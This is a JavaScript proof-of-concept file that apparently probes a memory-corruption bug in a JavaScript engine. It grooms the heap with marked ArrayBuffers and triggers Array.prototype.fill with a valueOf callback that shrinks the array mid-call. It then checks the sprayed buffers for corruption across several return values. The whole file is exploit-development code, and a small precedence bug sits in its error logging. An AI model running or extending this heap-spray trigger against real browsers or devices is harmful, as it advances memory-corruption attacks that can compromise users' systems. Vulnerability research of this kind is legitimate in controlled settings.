import { log, sleep } from './module/utils.mjs';

const MARK = 0x42424242;

function allocSpray(leftCount, rightCount) {
    const left = [];
    const right = [];
    for (let i = 0; i < leftCount; i++) {
        const b = new ArrayBuffer(0x4000);
        const v = new Uint32Array(b);
        v[0] = MARK;
        v[1] = 0x11111111;
        left.push(b);
    }
    for (let i = 0; i < rightCount; i++) {
        const b = new ArrayBuffer(0x4000);
        const v = new Uint32Array(b);
        v[0] = 0x99999999;
        v[1] = MARK;
        right.push(b);
    }
    return { left, right };
}

function trigger(returnVal) {
    const v0 = [];
    for (let i = 0; i < 2000; i++) {
        v0[i] = { tag: 0xdead, idx: i, buf: new ArrayBuffer(32) };
    }
    const v10 = new Object(Object, v0);

    function f11() {
        v0.length = 0;
        return returnVal;
    }
    const o14 = { valueOf: f11 };

    try {
        v0.fill(v10, o14);
        log("fill completed (no crash)");
    } catch (e) {
        log("fill threw:" + e && e.message);
    }

    return { v0, v10 };
}

function check(left, right) {
    let corrupted = 0;
    for (let i = 0; i < left.length; i++) {
        const v = new Uint32Array(left[i]);
        if (v[0] !== MARK || v[1] !== 0x11111111) {
            log("Left block corrupted at" + i + v[0] + v[1]);
            corrupted++;
        }
    }
    for (let i = 0; i < right.length; i++) {
        const v = new Uint32Array(right[i]);
        if (v[0] !== 0x99999999 || v[1] !== MARK) {
            log("Right block corrupted at" + i + v[0] + v[1]);
            corrupted++;
        }
    }
    return corrupted;
}

async function main() {
    const values = [-889, -1000, -500, -100, -10, 0, 10, 100, 500, 1000];
    
    for (const returnValue of values) {
        log("Testing return value:" + returnValue);
        const { left, right } = allocSpray(50, 50);
        const tmp = [];
        for (let i = 0; i < 300; i++) tmp.push(new ArrayBuffer(0x1000));

        trigger(returnValue);
        const corrupted = check(left, right);
        log("Corrupted blocks:" + corrupted);
        
        await sleep(100);
        log("---");
    }
    
    log("done");
}

main();